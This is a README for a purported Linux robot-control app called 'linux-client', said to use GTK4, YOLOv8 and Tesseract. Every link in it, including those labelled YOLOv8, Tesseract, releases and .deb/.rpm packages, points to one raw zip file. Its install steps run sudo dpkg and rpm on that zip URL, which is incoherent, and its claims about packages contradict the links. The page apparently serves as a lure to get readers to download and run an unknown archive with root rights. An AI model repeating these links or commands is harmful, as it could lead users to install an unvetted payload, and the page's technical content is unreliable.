# 🤖 linux-client - Simple Robot Control with Real-Time Detection

[![Download linux-client](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)

---

## 📋 What is linux-client?

linux-client is a native Linux app designed to help you manage and control robots with ease. It works with GNOME desktop using modern GTK4 technology. The app uses advanced tools like YOLOv8 for object detection and Tesseract OCR to read text in images. It also connects with robots and other devices using WebSockets, letting you control robots in real time with low delay.

The app supports autonomous object tracking, so the robot can follow things on its own. It also comes ready to install on popular Linux systems through easy DEB and RPM packages. This means you can get started faster with no complex setup.

---

## 🖥️ System Requirements

Before you install, make sure your computer meets these needs:

- **Operating System:** Linux with GNOME desktop environment (Ubuntu 22.04 or later recommended; Fedora 36 or later supported)
- **Processor:** 64-bit Intel or AMD CPU (modern multi-core processor preferred)
- **Memory:** At least 4 GB of RAM
- **Graphics:** Standard graphics capable of running GTK4 apps (no special GPU required)
- **Storage:** Around 200 MB free for installation and cache
- **Dependencies:** Python 3.10 or later (the package includes needed libraries)
- **Network:** Active internet connection for WebSocket communication with the robot

---

## 🚀 Getting Started: Download and Run linux-client

You can download the app right now to get control of your robots without fuss. The app is packaged as easy-to-install files for most Linux systems.

### Step 1: Visit the download page  
Click the big button above or visit this page:  
[https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)

This page hosts the latest version and all release files.

### Step 2: Choose the right package for your system

- If you use **Ubuntu, Debian, or similar**, look for a `.deb` package (example: `https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip`).
- If you use **Fedora, openSUSE, or similar**, pick the `.rpm` package (example: `https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip`).

Each file has the name format to help you find the right one.

### Step 3: Download the package

Click on the chosen file to download it. Save it to a folder you can find easily, like your Downloads folder.

### Step 4: Install the app

Open the terminal application on your Linux machine and navigate to the folder with the package. Use one of these commands:

- For `.deb` files (Debian/Ubuntu):

  ```
  sudo dpkg -i https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip
  sudo apt-get install -f
  ```

  The second command fixes any missing dependencies.

- For `.rpm` files (Fedora/openSUSE):

  ```
  sudo rpm -ivh https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip
  ```

If you prefer, you can also double-click the downloaded file in your file manager to open it with your package installer, then follow the on-screen prompts.

### Step 5: Launch linux-client

Once installed, find the app in your GNOME application menu under "linux-client" or search for it directly by name.

Click the icon to open it. You should see the main control interface ready for your robot.

---

## 🔧 How to Use linux-client

This section guides you through basic steps to start controlling a robot.

### Connect your robot

1. Ensure your robot is powered on and connected to the same network as your computer.
2. In linux-client, go to the "Settings" tab.
3. Enter the IP address or hostname of your robot.
4. Choose the WebSocket port if needed (defaults are set).
5. Click **Connect**.

If the connection is successful, you will see live status updates and video streams.

### Control the robot

- Use the joystick or arrow buttons on the screen to move the robot.
- Switch to autonomous tracking mode to enable the robot to follow an object using camera detection.
- View the live camera feed with detected objects highlighted by YOLOv8.
- Use the OCR feature to read any text the robot camera captures.

### Adjust detection settings

Under the "Detection" tab, you can tune parameters for object tracking and OCR accuracy. These options help the robot react better in your environment.

### Monitor communication

The app shows WebSocket connection status in the corner. This ensures commands go through with minimal delay.

---

## 🛠️ Troubleshooting Tips

- **App won’t start:** Make sure all dependencies installed correctly. Running `sudo apt-get install -f` or the equivalent for your system can help.
- **Cannot connect to robot:** Check that the robot’s IP address is correct and on the same network. Confirm the robot is powered on.
- **Object detection is slow:** Close other heavy apps. A system with a faster processor or more RAM improves performance.
- **OCR errors:** Improve lighting or angle, as Tesseract works best with clear images.
- **Package installation errors:** Update your system using package manager commands like `sudo apt update` or `sudo dnf upgrade`.

---

## 🔄 Updates & New Versions

Follow the releases page to get notified when new versions are available:  
[https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)

Regular updates improve performance, add new features, and fix bugs.

---

## 📚 Learn More and Support

- The app uses cutting-edge open-source projects like YOLOv8 for object detection and Tesseract OCR to read text.
- It’s designed for real-time control with minimal delay, making robot management smoother.
- The app fits well in GNOME desktops with modern GTK4 and libadwaita styling for native look and feel.

For help or to report issues, please use the repository’s issue tracker.

---

## ⚙️ Under the Hood: Tech Summary (Optional)

- Built with Python 3 and GTK4 using libadwaita for Linux-native integration.
- Asyncio handles real-time communication and robot command updates.
- WebSockets enable a continuous low-latency connection between the app and robots.
- YOLOv8 provides fast, accurate object detection on edge devices.
- Tesseract OCR reads text seen by robot cameras.
- Distributed as DEB and RPM packages for easy installation on major Linux distributions.

---

## 📂 Related Links

- [GitHub Repository](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)
- [Releases & Downloads](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)  
- [YOLOv8](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)
- [Tesseract OCR](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)

---

This guide covers everything you need to download, install, and operate the linux-client app on your Linux system. Follow each step carefully to get your robot working smoothly.